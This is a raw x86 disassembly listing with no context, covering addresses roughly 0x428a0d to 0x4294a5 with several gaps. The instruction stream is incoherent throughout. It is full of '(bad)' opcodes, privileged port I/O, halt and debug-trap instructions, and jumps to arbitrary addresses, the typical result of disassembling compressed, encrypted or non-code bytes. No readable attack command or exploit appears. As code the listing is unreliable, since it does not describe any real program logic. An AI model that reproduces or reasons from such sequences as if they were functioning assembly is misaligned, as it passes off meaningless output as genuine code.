  428a0d:	jp     0x4289bf
  428a0f:	and    DWORD PTR [ebp+0x4eda469c],ebp
  428a15:	hlt    
  428a16:	and    eax,0x75b53630
  428a1b:	ins    BYTE PTR es:[edi],dx
  428a1c:	data16 add bh,dh
  428a1f:	dec    esp
  428a20:	aas    
  428a21:	icebp  
  428a22:	sub    eax,0x44de5fab
  428a27:	aad    0x5a
  428a29:	xor    bh,dl
  428a2b:	dec    ecx
  428a2c:	sbb    BYTE PTR [ebp-0xf],dh
  428a2f:	out    0xd3,eax
  428a31:	inc    eax
  428a32:	and    ch,ch
  428a34:	bnd ret 0x5e3b
  428a38:	xchg   esi,eax
  428a39:	loopne 0x4289d4
  428a3b:	es dec ebp
  428a3d:	and    esp,DWORD PTR [eax]
  428a3f:	repz mov dl,0xc6
  428a42:	je     0x428a8e
  428a44:	adc    BYTE PTR [ecx+0x1f],al
  428a47:	push   ebp
  428a48:	not    BYTE PTR [ebx]
  428a4a:	mov    ecx,ds
  428a4c:	pusha  
  428a4d:	sub    esp,DWORD PTR [edx]
  428a4f:	jb     0x428aab
  428a51:	dec    esp
  428a52:	push   esi
  428a53:	cwde   
  428a54:	imul   ebx,DWORD PTR ds:0xe03e863a,0x4c
  428a5b:	pusha  
  428a5c:	pusha  
  428a5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428a5e:	cmp    al,0xde
  428a60:	fwait
  428a61:	ja     0x428a23
  428a63:	out    0x65,eax
  428a65:	mov    ecx,0x27a5aa72
  428a6a:	imul   DWORD PTR [esi+0x37]
	...
  428ad4:	add    BYTE PTR [eax],al
  428ad6:	dec    ebp
  428ad7:	or     al,0xf8
  428ad9:	pop    ebx
  428ada:	stc    
  428adb:	(bad)  
  428adc:	out    dx,eax
  428add:	push   ds
  428ade:	pop    ds
  428adf:	bound  edx,QWORD PTR [eax+0x117dc213]
  428ae5:	mov    dh,BYTE PTR [bp+di+0x1]
  428aea:	inc    DWORD PTR [eax]
  428aec:	add    BYTE PTR [eax],al
  428aee:	or     ch,bh
  428af0:	ds jbe 0x428b21
  428af3:	jge    0x428ae8
  428af5:	stos   DWORD PTR es:[edi],eax
  428af6:	(bad)  
  428af8:	inc    ebp
  428af9:	xlat   BYTE PTR ds:[ebx]
  428afa:	xor    edx,DWORD PTR [ebp+0x5680a19d]
  428b00:	scas   al,BYTE PTR es:[edi]
  428b01:	(bad)  
  428b02:	push   ecx
  428b03:	mov    bl,0xe5
  428b05:	in     eax,dx
  428b06:	and    dl,BYTE PTR [edi-0x5]
  428b09:	in     al,0xb1
  428b0b:	pop    edx
  428b0c:	mov    al,0x76
  428b0e:	push   edi
  428b0f:	xchg   edx,eax
  428b10:	pushf  
  428b11:	fimul  WORD PTR [ecx]
  428b13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428b14:	in     eax,0xa2
  428b16:	popa   
  428b17:	lock sub al,ah
  428b1a:	inc    edi
  428b1b:	cwde   
  428b1c:	push   ds
  428b1d:	pop    ebp
  428b1e:	addr16 push ss
  428b20:	loope  0x428b61
  428b22:	mov    bh,al
  428b24:	sbb    BYTE PTR [edx-0x6189751b],ah
  428b2a:	cdq    
  428b2b:	mov    dh,0xa
  428b2d:	xchg   DWORD PTR [ecx+0x78],ecx
  428b30:	dec    esp
  428b31:	jle    0x428b7c
  428b33:	sub    DWORD PTR [edi+0x137973a4],0x32
  428b3a:	or     eax,0x4be3a07d
  428b3f:	lods   eax,DWORD PTR ds:[esi]
  428b40:	inc    edi
  428b41:	and    bl,dl
  428b43:	out    dx,al
  428b44:	or     dl,BYTE PTR [ebp+0x450a48b]
  428b4a:	test   BYTE PTR [esi-0xf],0xc6
  428b4e:	cmp    eax,0xd939b729
  428b53:	mov    ah,0x6e
  428b55:	(bad)  [eax]
  428b57:	add    BYTE PTR [ecx+0x2b],dl
  428b5a:	mov    WORD PTR [ebp-0x54cc3040],ss
  428b60:	test   BYTE PTR [eax+ebx*8+0x6f],bh
  428b64:	test   al,0x34
  428b66:	outs   dx,DWORD PTR ds:[esi]
  428b67:	sbb    BYTE PTR [edi-0x1968b09c],dh
  428b6d:	mov    al,0x76
  428b6f:	or     eax,0x134e3181
  428b74:	mov    ds:0xffaa5543,eax
  428b79:	pop    esi
  428b7a:	mov    esp,0xabe3d722
  428b7f:	pushf  
  428b80:	and    BYTE PTR [eax-0x4f],bl
  428b83:	push   ss
  428b84:	xor    esi,ebx
  428b86:	mov    cl,dh
  428b88:	dec    ecx
  428b89:	(bad)  
  428b8a:	adc    cl,BYTE PTR [esi]
  428b8c:	sti    
  428b8d:	dec    eax
  428b8e:	pop    ecx
  428b8f:	test   al,0xf6
  428b91:	dec    eax
  428b92:	mov    esi,0x71684122
  428b97:	retf   0x3b74
  428b9a:	add    ebx,DWORD PTR [ecx]
  428b9c:	fsub   DWORD PTR [ecx+0x3cac0dc7]
  428ba2:	sub    al,0x69
  428ba4:	retf   0xe56f
  428ba7:	test   BYTE PTR [edx+ecx*1+0x3b787a15],dl
  428bae:	mov    al,ds:0x6a6ba762
  428bb3:	(bad)  
  428bb5:	inc    ebx
  428bb6:	sub    DWORD PTR [edi],esi
  428bb8:	(bad)  
  428bb9:	lahf   
  428bba:	dec    ebx
  428bbb:	inc    edx
  428bbc:	add    eax,0x1fe6136a
  428bc1:	(bad)  
  428bc2:	ret    0x6ab0
  428bc5:	fwait
  428bc6:	jb     0x428c0c
  428bc8:	push   ebx
  428bc9:	imul   ecx,edx,0xeec97301
  428bcf:	mov    ch,0xa
  428bd1:	add    BYTE PTR [ebx],ch
  428bd3:	sbb    DWORD PTR [esp+ebx*4],ebp
  428bd6:	hlt    
  428bd7:	adc    al,0x2b
  428bd9:	and    bl,BYTE PTR [ecx+0x47935f81]
  428bdf:	dec    edx
  428be0:	mov    ch,0xc5
  428be2:	scas   eax,DWORD PTR es:[edi]
  428be3:	cdq    
  428be4:	inc    esi
  428be5:	loopne 0x428b79
  428be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428be8:	inc    esp
  428be9:	and    eax,0x7d81bc
	...
  428c56:	lds    edx,FWORD PTR [ebp-0x76]
  428c59:	cli    
  428c5a:	call   0xbbc:0x947ff5ff
  428c61:	push   0xb73c1ddc
  428c66:	mov    DWORD PTR [ecx+eax*1+0xff00],esi
  428c6d:	add    BYTE PTR [esp+ecx*8+0x751cd2fd],ch
  428c74:	shl    DWORD PTR [ecx+0x1f],0xec
  428c78:	jp     0x428c27
  428c7a:	repnz aad 0xa2
  428c7d:	dec    ecx
  428c7e:	mov    ds:0x54dec046,al
  428c83:	and    BYTE PTR ds:[eax-0x64],bl
  428c87:	add    BYTE PTR [ebx+0x54],cl
  428c8a:	nop
  428c8b:	xchg   ebx,eax
  428c8c:	sbb    DWORD PTR [eax-0x41592c7e],0xf96c7d3a
  428c96:	les    ebp,FWORD PTR [ecx]
  428c98:	les    esp,FWORD PTR [edi*2-0x66a87209]
  428c9f:	sub    esi,eax
  428ca1:	je     0x428d16
  428ca3:	lahf   
  428ca4:	fstp   TBYTE PTR [esi-0x26714f87]
  428caa:	mov    esp,0xfe7ae055
  428caf:	scas   eax,DWORD PTR es:[edi]
  428cb0:	jns    0x428c98
  428cb2:	test   al,0x4
  428cb4:	into   
  428cb5:	dec    edi
  428cb6:	jns    0x428d0c
  428cb8:	push   ds
  428cb9:	scas   eax,DWORD PTR es:[edi]
  428cba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  428cbb:	jle    0x428c45
  428cbd:	xlat   BYTE PTR ds:[ebx]
  428cbe:	mov    bh,0x7e
  428cc0:	push   ebp
  428cc1:	dec    ebx
  428cc2:	mov    ebp,0x8a9f6106
  428cc7:	and    eax,0xadff27d6
  428ccc:	(bad)  
  428ccd:	into   
  428cce:	add    al,0x93
  428cd0:	pop    esi
  428cd1:	jb     0x428d00
  428cd3:	call   0x62629c89
  428cd8:	ins    DWORD PTR es:[edi],dx
  428cd9:	lods   al,BYTE PTR ds:[esi]
  428cda:	leave  
  428cdb:	push   ds
  428cdc:	pop    ecx
  428cdd:	cmp    ah,ch
  428cdf:	ret    
  428ce0:	pop    esp
  428ce1:	jp     0x428c8d
  428ce3:	xor    BYTE PTR [ebp-0x5a],bl
  428ce6:	mov    esi,0x6560228c
  428ceb:	pushf  
  428cec:	sub    al,0xd9
  428cee:	adc    BYTE PTR [ebx-0x7305d189],al
  428cf4:	xchg   esi,eax
  428cf5:	push   ss
  428cf6:	xor    BYTE PTR [eax],al
  428cf8:	dec    DWORD PTR [edi+0x57]
  428cfb:	in     eax,dx
  428cfc:	sub    ch,dh
  428cfe:	std    
  428cff:	loop   0x428d5a
  428d01:	mov    WORD PTR [ecx+0x17031f1c],?
  428d07:	push   0x80b475e4
  428d0c:	xor    eax,0x2cf11843
  428d11:	mov    al,0x73
  428d13:	jmp    0x428cb3
  428d15:	push   ss
  428d16:	outs   dx,BYTE PTR ds:[esi]
  428d17:	(bad)  
  428d18:	jl     0x428d46
  428d1a:	ror    DWORD PTR [ebx+0x24c65b94],cl
  428d20:	pusha  
  428d21:	pop    edx
  428d22:	cmp    eax,0x26589eac
  428d27:	mov    bh,0xdd
  428d29:	pushf  
  428d2a:	(bad)  
  428d2b:	retf   0x66f4
  428d2e:	jns    0x428cfe
  428d30:	add    DWORD PTR ds:0x887c209e,eax
  428d36:	sbb    dh,bh
  428d38:	sbb    al,0x29
  428d3a:	jnp    0x428cd4
  428d3c:	loopne 0x428d70
  428d3e:	shr    DWORD PTR [edi],1
  428d40:	dec    ebx
  428d41:	fisttp DWORD PTR [esi]
  428d43:	inc    eax
  428d44:	inc    ebx
  428d45:	es mov ah,0x2f
  428d48:	jg     0x428db6
  428d4a:	ret    
  428d4b:	(bad)  
  428d4c:	mov    edx,0x78dd5823
  428d51:	lods   eax,DWORD PTR ds:[esi]
  428d52:	popa   
  428d53:	xor    DWORD PTR [esi-0x407af4fb],eax
  428d59:	fsub   DWORD PTR es:[edx]
  428d5c:	jge    0x428d26
  428d5e:	dec    ebx
  428d5f:	(bad)  
  428d60:	adc    bl,BYTE PTR [edi+0x57]
  428d63:	int    0xfe
  428d65:	cmp    al,BYTE PTR [ecx+0x457b5a8f]
  428d6b:	xor    eax,0xd4
	...
  428dd4:	add    BYTE PTR [eax],al
  428dd6:	xor    DWORD PTR [ebp+0x75f531f1],0xcc90b5c1
  428de0:	ins    BYTE PTR es:[edi],dx
  428de1:	retf   0x38f9
  428de4:	int3   
  428de5:	das    
  428de6:	mov    BYTE PTR [ebp+0xff0001],dh
  428dec:	add    BYTE PTR [eax],al
  428dee:	push   ebx
  428def:	mov    al,dh
  428df1:	rcl    DWORD PTR [edi+0x16],0x10
  428df5:	mov    edi,0x12862f0
  428dfa:	and    ah,BYTE PTR [ecx+ebx*2+0x54]
  428dfe:	inc    ecx
  428dff:	xlat   BYTE PTR ds:[ebx]
  428e00:	(bad)  
  428e01:	mov    eax,0xb0a674cb
  428e06:	popf   
  428e07:	or     al,BYTE PTR [ebx+0x4e89ca1b]
  428e0d:	push   eax
  428e0e:	mov    al,ds:0x6571332f
  428e13:	ins    DWORD PTR es:[edi],dx
  428e14:	imul   esp,DWORD PTR [eax+0x5b],0x93261c88
  428e1b:	or     eax,0x3bc82a8d
  428e20:	pushf  
  428e21:	shr    BYTE PTR [ecx-0x58],0xde
  428e25:	add    al,BYTE PTR [ebx+0x1a]
  428e28:	ja     0x428dbe
  428e2a:	nop
  428e2b:	jae    0x428e2a
  428e2d:	into   
  428e2e:	sub    BYTE PTR [edx+0x6a],ch
  428e31:	scas   al,BYTE PTR es:[edi]
  428e32:	push   edi
  428e33:	mov    ds:0x3e27ed79,al
  428e38:	sbb    ah,BYTE PTR [esi+0x13]
  428e3b:	add    dl,BYTE PTR [ecx+0x61]
  428e3e:	mov    al,ds:0xe960e4b6
  428e43:	jge    0x428e61
  428e45:	mov    dl,0x9f
  428e47:	enter  0xcf5b,0x5d
  428e4b:	mov    al,ds:0xce34f800
  428e50:	popf   
  428e51:	clc    
  428e52:	in     eax,0x18
  428e54:	imul   eax,DWORD PTR [esi+0x31355b3b],0xffffffbe
  428e5b:	jne    0x428e62
  428e5d:	lahf   
  428e5e:	scas   eax,DWORD PTR es:[edi]
  428e5f:	mov    ebp,0xca6a3c32
  428e64:	mov    edx,0xc1852bac
  428e69:	jg     0x428e2d
  428e6b:	sub    dl,BYTE PTR [edi+eax*2-0x7d2611e4]
  428e72:	jge    0x428e5b
  428e74:	lahf   
  428e75:	jl     0x428e2b
  428e77:	call   0xb22e8342
  428e7c:	xor    al,0x48
  428e7e:	fadd   QWORD PTR [eax+eax*8]
  428e81:	sahf   
  428e82:	fst    DWORD PTR ds:0xa3f7067
  428e88:	pop    ebx
  428e89:	add    al,BYTE PTR [edi+0x29bc3f66]
  428e8f:	or     bl,BYTE PTR [edx-0x68ef8d3f]
  428e95:	(bad)  
  428e96:	dec    ebp
  428e97:	dec    ebx
  428e98:	mov    al,0xd2
  428e9a:	aad    0x3b
  428e9c:	clc    
  428e9d:	adc    al,0xae
  428e9f:	sub    eax,0x6590dc24
  428ea4:	cs into 
  428ea6:	jecxz  0x428e5b
  428ea8:	xchg   ecx,eax
  428ea9:	jl     0x428e88
  428eab:	jl     0x428eda
  428ead:	mov    esi,DWORD PTR [eax-0x6984cbf0]
  428eb3:	int    0xde
  428eb5:	pop    ds
  428eb6:	out    dx,al
  428eb7:	push   es
  428eb8:	pop    eax
  428eb9:	jne    0x428efe
  428ebb:	lahf   
  428ebc:	xchg   BYTE PTR [esi+0x4e234580],bl
  428ec2:	fidiv  WORD PTR cs:[edi-0x32]
  428ec6:	ins    BYTE PTR es:[edi],dx
  428ec7:	mov    BYTE PTR [ebx+0x1b9e5675],ah
  428ecd:	fnstenv ds:0x3d760e9b
  428ed3:	test   BYTE PTR cs:[edx+ebp*1-0x2d2979e],ah
  428edb:	out    dx,al
  428edc:	sub    ch,dh
  428ede:	jp     0x428ecc
  428ee0:	out    0xa8,eax
  428ee2:	(bad)  
  428ee3:	stc    
  428ee4:	jae    0x428f5e
  428ee6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428ee7:	and    eax,0xa9b47f83
  428eec:	xchg   ecx,eax
	...
  428f55:	add    BYTE PTR [edi+0x5d],cl
  428f58:	pop    ecx
  428f59:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  428f5d:	fstp   st(1)
  428f5f:	ror    DWORD PTR [esp+edx*4],0x45
  428f63:	push   ebx
  428f64:	in     al,dx
  428f65:	rol    BYTE PTR [edi-0xfffe4a],0x0
  428f6c:	add    BYTE PTR [eax],al
  428f6e:	mov    ch,0xfd
  428f70:	pop    ebx
  428f71:	ins    DWORD PTR es:[edi],dx
  428f72:	rcr    esi,0xd9
  428f75:	mov    BYTE PTR [eax-0x162a5813],al
  428f7b:	sbb    ebx,DWORD PTR [ecx-0x2d]
  428f7e:	adc    DWORD PTR [ebx+edi*4-0x722c0eb6],0x576b0cbe
  428f89:	cli    
  428f8a:	add    DWORD PTR [edx+0x70],0xe
  428f8e:	je     0x428f49
  428f90:	icebp  
  428f91:	retf   
  428f92:	mov    dl,0x3c
  428f94:	std    
  428f95:	push   ecx
  428f96:	lods   eax,DWORD PTR ds:[esi]
  428f97:	retf   
  428f98:	sbb    esi,DWORD PTR [edi-0x68]
  428f9b:	popa   
  428f9c:	dec    ebp
  428f9d:	int3   
  428f9e:	mov    ebx,0xa9d31027
  428fa3:	jnp    0x428fc3
  428fa5:	mov    dl,0xd3
  428fa7:	je     0x428f33
  428fa9:	mov    ecx,0x70562db6
  428fae:	jle    0x428f71
  428fb0:	es fwait
  428fb2:	neg    DWORD PTR [eax+0x60]
  428fb5:	inc    ecx
  428fb6:	jmp    ebp
  428fb8:	jp     0x428fc1
  428fba:	sub    edx,DWORD PTR [edx-0x1d]
  428fbd:	jne    0x428fec
  428fbf:	inc    esi
  428fc0:	iret   
  428fc1:	push   esi
  428fc2:	mov    ds:0xc0698f5e,eax
  428fc7:	fisttp DWORD PTR [esp+ebx*8+0x17]
  428fcb:	mov    dh,0xe8
  428fcd:	shl    DWORD PTR [ebx+edx*1-0x2b],cl
  428fd1:	sbb    edx,DWORD PTR [esi-0x770a67a1]
  428fd7:	xor    eax,0xaea6c4c9
  428fdc:	shl    DWORD PTR [esp+eiz*8-0x39a0e4e4],0x7d
  428fe4:	mov    ch,BYTE PTR [ebp-0x80]
  428fe7:	mov    dl,0x6a
  428fe9:	cmp    eax,edx
  428feb:	sub    BYTE PTR [ebp+0x1fa89f7f],ch
  428ff1:	out    dx,al
  428ff2:	sbb    ch,BYTE PTR [esi-0x7bbcd504]
  428ff8:	fs inc edi
  428ffa:	adc    al,dl
  428ffc:	xchg   edi,eax
  428ffd:	sbb    al,0x40
  428fff:	adc    edx,DWORD PTR [ebx-0xb]
  429002:	and    dl,cl
  429004:	les    esi,FWORD PTR [eax+0x3efef724]
  42900a:	mov    bl,0xb4
  42900c:	push   ebp
  42900d:	stc    
  42900e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42900f:	repz dec esi
  429011:	test   al,0x2c
  429013:	shl    BYTE PTR [edi+0x2b0d0461],0x76
  42901a:	xchg   dl,cl
  42901c:	mov    ecx,0x7cd67ab9
  429021:	loopne 0x42903b
  429023:	mov    dh,0x2c
  429025:	jnp    0x42909c
  429027:	enter  0xabb5,0x74
  42902b:	fs or  al,0xba
  42902e:	rcr    DWORD PTR [edi],0xd4
  429031:	mov    bh,0x4d
  429033:	jns    0x428fc5
  429035:	cmp    al,0xe
  429037:	dec    ebp
  429038:	js     0x42905f
  42903a:	icebp  
  42903b:	fucom  st(0)
  42903d:	jae    0x429036
  42903f:	inc    esi
  429040:	repnz sub eax,0xaa5f4658
  429046:	sub    DWORD PTR [ebp-0x5859ab6b],ebp
  42904c:	(bad)  
  42904d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42904e:	push   es
  42904f:	test   al,0x1e
  429051:	mov    ecx,0x1b0fa3fb
  429056:	jecxz  0x42909e
  429058:	shl    BYTE PTR [ebx+0x34],0x91
  42905c:	and    ebp,DWORD PTR [edi]
  42905e:	inc    ebx
  42905f:	sub    al,0xb1
  429061:	mov    esp,0xc54ff083
  429066:	fidiv  DWORD PTR [edx+0x2040eb39]
  42906c:	aaa    
	...
  4290d5:	add    cl,ah
  4290d7:	in     al,dx
  4290d8:	mov    ebx,es
  4290da:	(bad)  
  4290db:	jecxz  0x4290cc
  4290dd:	out    dx,al
  4290de:	mov    edi,0x66fc7b77
  4290e3:	jno    0x42909a
  4290e5:	mov    al,0x86
  4290e7:	mov    bh,0x1
  4290e9:	add    bh,bh
  4290eb:	add    BYTE PTR [eax],al
  4290ed:	add    al,bh
  4290ef:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  4290f1:	call   0x48d48235
  4290f6:	pushf  
  4290f7:	faddp  st(6),st
  4290f9:	mov    al,ds:0x993c7cad
  4290fe:	and    al,0x59
  429100:	dec    eax
  429101:	dec    edi
  429102:	mov    al,0x64
  429104:	xor    eax,0xe13b5d55
  429109:	out    0x58,al
  42910b:	or     DWORD PTR [eax-0x47bdd1e0],0x97848ec1
  429115:	push   edi
  429116:	pop    es
  429117:	jmp    0x42917d
  429119:	push   ebp
  42911a:	pop    edi
  42911b:	fwait
  42911c:	ins    DWORD PTR es:[edi],dx
  42911d:	lahf   
  42911e:	adc    eax,DWORD PTR [esi+0x28]
  429121:	loop   0x429109
  429123:	mov    WORD PTR [edx],es
  429125:	jo     0x42913b
  429127:	mov    ecx,0x6380b04a
  42912c:	lock gs xchg ecx,eax
  42912f:	and    bh,BYTE PTR [esi]
  429131:	jmp    0x94b71613
  429136:	int    0x65
  429138:	ins    BYTE PTR es:[edi],dx
  429139:	add    eax,0xe9a8b202
  42913e:	mov    esi,0x97d99034
  429143:	mov    edx,0xfdaeed0
  429148:	in     eax,dx
  429149:	push   ss
  42914a:	call   0xb028:0xc5533231
  429151:	xor    cl,BYTE PTR [edi+0x25]
  429154:	fisttp DWORD PTR [ebp-0x63]
  429157:	outs   dx,BYTE PTR ds:[esi]
  429158:	fbld   TBYTE PTR [esi-0xc]
  42915b:	dec    ebp
  42915c:	repnz fwait
  42915e:	push   ecx
  42915f:	jae    0x429153
  429161:	popf   
  429162:	popf   
  429163:	push   ebx
  429164:	in     al,0xc9
  429166:	test   BYTE PTR [edx+0x3e9c6320],cl
  42916c:	mov    edi,0xa5c20a03
  429171:	sbb    ch,ah
  429173:	jns    0x42913b
  429175:	adc    eax,0x99770ebc
  42917a:	jo     0x4291a1
  42917c:	jle    0x42916d
  42917e:	ins    BYTE PTR es:[edi],dx
  42917f:	fisub  WORD PTR [eax]
  429181:	mov    ecx,0xc7fd1231
  429186:	inc    eax
  429187:	or     DWORD PTR [edx-0x678dda82],ebx
  42918d:	pop    esp
  42918e:	aad    0x15
  429190:	scas   eax,DWORD PTR es:[edi]
  429191:	loopne 0x42918c
  429193:	mov    edi,0xed0ca077
  429198:	clc    
  429199:	push   ecx
  42919a:	and    al,dl
  42919c:	dec    ebp
  42919d:	imul   BYTE PTR [edi+0x6e]
  4291a0:	pop    ss
  4291a1:	and    eax,DWORD PTR [edi+0x3ade322d]
  4291a7:	rcl    BYTE PTR [edi-0x12],1
  4291aa:	push   ds
  4291ab:	clc    
  4291ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4291ad:	into   
  4291ae:	adc    DWORD PTR [eax-0x20],ecx
  4291b1:	cmovne esi,DWORD PTR ds:0x8e2877b3
  4291b8:	jo     0x4291ae
  4291ba:	pop    DWORD PTR [eax+0x5bb393c8]
  4291c0:	cmp    eax,0xd45334be
  4291c5:	(bad)  
  4291c6:	fcmovu st,st(2)
  4291c8:	out    0x73,eax
  4291ca:	and    bh,BYTE PTR [edi+0x49c38c32]
  4291d0:	les    eax,FWORD PTR [bx+di-0x24]
  4291d4:	sbb    BYTE PTR ds:0x723d24f9,dl
  4291da:	mov    eax,ds:0x6368d3a7
  4291df:	call   0xfa77ca05
  4291e4:	jbe    0x4291a8
  4291e6:	mov    cl,0x42
  4291e8:	sbb    edi,DWORD PTR [edx]
  4291ea:	(bad)  
  4291eb:	out    dx,al
  4291ec:	jp     0x4291ee
	...
  429256:	push   esi
  429257:	xchg   ebp,edi
  429259:	test   ch,bh
  42925b:	(bad)  
  42925c:	jg     0x429235
  42925e:	into   
  42925f:	retf   
  429260:	or     DWORD PTR [eax+eax*8-0x7a8c895f],0xff0001b8
  42926b:	add    BYTE PTR [eax],al
  42926d:	add    cl,dh
  42926f:	pop    ss
  429270:	mov    edi,0x33ba8cb5
  429275:	test   BYTE PTR [esp+ebx*4],cl
  429278:	test   DWORD PTR [ebp+0x2e],edx
  42927b:	or     eax,0x75b089c4
  429280:	mov    al,0x34
  429282:	pop    ds
  429283:	mul    BYTE PTR [ebp+0x77]
  429286:	lods   al,BYTE PTR ds:[esi]
  429287:	or     dh,BYTE PTR [ebp+0x56]
  42928a:	mov    cl,0x8b
  42928c:	adc    DWORD PTR [edi-0x7d],ecx
  42928f:	or     DWORD PTR [ecx],ebp
  429291:	xchg   esi,eax
  429292:	cwde   
  429293:	mov    esi,0x32fec948
  429298:	inc    ecx
  429299:	mov    eax,0xd220174d
  42929e:	ja     0x429273
  4292a0:	mov    bh,0xbd
  4292a2:	push   cs
  4292a3:	je     0x42922f
  4292a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4292a6:	stos   BYTE PTR es:[edi],al
  4292a7:	pop    ebx
  4292a8:	adc    al,0x7e
  4292aa:	unpckhps xmm0,xmm4
  4292ad:	ds sti 
  4292af:	dec    esi
  4292b0:	lock retf 0x95a3
  4292b4:	dec    ebp
  4292b5:	sti    
  4292b6:	outs   dx,BYTE PTR ds:[esi]
  4292b7:	dec    ebp
  4292b8:	sbb    esp,DWORD PTR [edx+0x22]
  4292bb:	in     eax,dx
  4292bc:	or     al,0x5f
  4292be:	addr16 aaa 
  4292c0:	cdq    
  4292c1:	sahf   
  4292c2:	xchg   ebx,eax
  4292c3:	xchg   esi,eax
  4292c4:	repz xor BYTE PTR [edi+ebx*4],dh
  4292c8:	mov    cl,0x7a
  4292ca:	xchg   ebp,esp
  4292cc:	popa   
  4292cd:	stos   BYTE PTR es:[edi],al
  4292ce:	xchg   ebx,eax
  4292cf:	xor    DWORD PTR [edx+edx*4-0x27],esi
  4292d3:	out    0x9c,eax
  4292d5:	dec    edi
  4292d6:	and    cl,BYTE PTR [ebx-0x2976c47d]
  4292dc:	cmp    al,0xaa
  4292de:	mov    cl,0x87
  4292e0:	sbb    eax,0xc58f6da5
  4292e5:	jbe    0x4292e8
  4292e7:	not    DWORD PTR [ecx+ebx*4]
  4292ea:	ret    0x6bc7
  4292ed:	ret    
  4292ee:	ror    DWORD PTR [ecx],0x82
  4292f1:	addr16 jge 0x4292c1
  4292f4:	shl    BYTE PTR [eax+0x13],cl
  4292f7:	xchg   esi,eax
  4292f8:	scas   eax,DWORD PTR es:[edi]
  4292f9:	test   DWORD PTR ds:0x2af60e8d,edx
  4292ff:	xchg   esi,eax
  429300:	xor    DWORD PTR [eax+0x45d255c1],0xb69d3be7
  42930a:	fs sahf 
  42930c:	inc    ecx
  42930d:	mov    eax,?
  42930f:	or     al,ch
  429311:	jg     0x429391
  429313:	gs adc al,0xc1
  429316:	mov    edx,0x6dd8b784
  42931b:	frstor [edx]
  42931d:	cld    
  42931e:	pop    ds
  42931f:	mov    cs,WORD PTR [edi+0x27]
  429322:	adc    edi,0x4627bc43
  429328:	int    0x84
  42932a:	scas   al,BYTE PTR es:[edi]
  42932b:	stc    
  42932c:	dec    esp
  42932d:	fsub   DWORD PTR [edx-0x590ce9c7]
  429333:	dec    edx
  429334:	jp     0x42931c
  429336:	cmc    
  429337:	xchg   esp,eax
  429338:	push   ecx
  429339:	aad    0x5d
  42933b:	ret    
  42933c:	gs push cs
  42933e:	shl    BYTE PTR [edi],1
  429340:	sub    DWORD PTR [eax+eax*8+0x75],esi
  429344:	xor    eax,0xd79760e5
  429349:	pop    edi
  42934a:	in     eax,0x6a
  42934c:	in     eax,dx
  42934d:	std    
  42934e:	pusha  
  42934f:	clc    
  429350:	jbe    0x42930b
  429352:	dec    esi
  429353:	neg    BYTE PTR [edi]
  429355:	sub    BYTE PTR [ecx],0xf9
  429358:	and    dh,BYTE PTR [eax-0x77]
  42935b:	cmp    eax,0x163cfecc
  429360:	lahf   
  429361:	leave  
  429362:	xchg   ecx,eax
  429363:	iret   
  429364:	hlt    
  429365:	ds inc esp
  429367:	mov    eax,0xa68525bb
  42936c:	lods   al,BYTE PTR ds:[esi]
	...
  4293d5:	add    al,dh
  4293d7:	adc    al,0xe1
  4293d9:	(bad)  
  4293da:	in     eax,0xff
  4293dc:	call   FWORD PTR [esi]
  4293de:	jae    0x4293e5
  4293e0:	dec    edx
  4293e1:	mov    bh,0x2f
  4293e3:	retf   0xd95f
  4293e6:	test   BYTE PTR [ecx+0xff0001],bh
  4293ec:	add    BYTE PTR [eax],al
  4293ee:	ins    DWORD PTR es:[edi],dx
  4293ef:	push   edi
  4293f0:	(bad)  
  4293f2:	outs   dx,DWORD PTR ds:[esi]
  4293f3:	cmp    al,BYTE PTR [ecx]
  4293f5:	ss ins DWORD PTR es:[edi],dx
  4293f7:	sbb    DWORD PTR [eax+edx*1+0x44],esp
  4293fb:	add    eax,0x711812bb
  429400:	loopne 0x4293f3
  429402:	loop   0x429403
  429404:	sbb    ch,BYTE PTR [edi]
  429406:	sbb    BYTE PTR [edx-0x93b515c],dh
  42940c:	sub    al,0x37
  42940e:	call   0x27f7:0x32cce1c8
  429415:	fild   WORD PTR [eax]
  429417:	sub    bh,dh
  429419:	jmp    FWORD PTR [edi-0x148e032d]
  42941f:	retf   0x99fb
  429422:	inc    eax
  429423:	cdq    
  429424:	sbb    eax,esp
  429426:	sub    al,cl
  429428:	idiv   eax
  42942a:	and    eax,0x9473bb12
  42942f:	and    al,0xc7
  429431:	nop
  429432:	inc    eax
  429433:	(bad)  
  429434:	into   
  429435:	fistp  DWORD PTR [esi-0x787d0b39]
  42943b:	jb     0x429479
  42943d:	jae    0x429457
  42943f:	stc    
  429440:	stc    
  429441:	inc    ebp
  429442:	out    dx,eax
  429443:	xchg   ecx,eax
  429444:	pop    ds
  429445:	fld    DWORD PTR [edi+0x7b]
  429448:	pop    ss
  429449:	and    al,0xbe
  42944b:	or     eax,0x52078642
  429450:	jg     0x429469
  429452:	mov    ebp,edx
  429454:	cmp    ch,cl
  429456:	scas   al,BYTE PTR es:[edi]
  429457:	sbb    ecx,DWORD PTR [esi]
  429459:	mov    esi,fs
  42945b:	bound  edx,QWORD PTR [edi+0x8]
  42945e:	(bad)  
  42945f:	cmp    BYTE PTR [esp+ecx*2+0x3656aebc],cl
  429466:	cs ins BYTE PTR es:[edi],dx
  429468:	lock call 0x8567:0xbd4dabd6
  429470:	add    BYTE PTR [edi+0x4487c8c7],cl
  429476:	adc    esp,0x2e
  429479:	pop    edx
  42947a:	in     eax,0x89
  42947c:	clc    
  42947d:	or     DWORD PTR [ebx+0x40368bcf],ebx
  429483:	xchg   eax,esi
  429485:	add    dl,dl
  429487:	xchg   ebp,eax
  429488:	pop    edi
  429489:	and    ecx,DWORD PTR [ebx+esi*2]
  42948c:	jge    0x4294c8
  42948e:	test   BYTE PTR [ebp+0xe],al
  429491:	xchg   edx,eax
  429492:	ret    
  429493:	mov    edx,0x3e4d9f35
  429498:	xchg   ebp,eax
  429499:	cmp    eax,0xd172dc7f
  42949e:	imul   esp,DWORD PTR ds:0xd4eeec8b,0x2a
  4294a5:	es out 0xe2,al
